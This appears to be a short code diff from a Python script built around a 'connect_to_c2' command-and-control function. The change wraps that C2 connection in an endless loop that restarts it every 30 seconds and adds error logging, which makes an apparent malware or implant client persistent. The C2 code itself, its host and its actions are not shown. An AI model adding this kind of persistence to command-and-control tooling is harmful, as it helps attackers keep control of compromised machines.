@@ -1186,10 +1186,20 @@ def connect_to_c2():
         time.sleep(1)
 
 def main():
-    connect_to_c2()
+    while True:
+        try:
+            print("Starting script...")
+            connect_to_c2()
+        except Exception as e:
+            print(f"Error occurred: {e}")
+        finally:
+            print("Restarted script")
+            time.sleep(30)
 
 if __name__ == '__main__':
     try:
         main()
-    except:
-        pass
+    except KeyboardInterrupt:
+        print("Script terminated by user")
+    except Exception as e:
+        print(f"Fatal error: {e}")
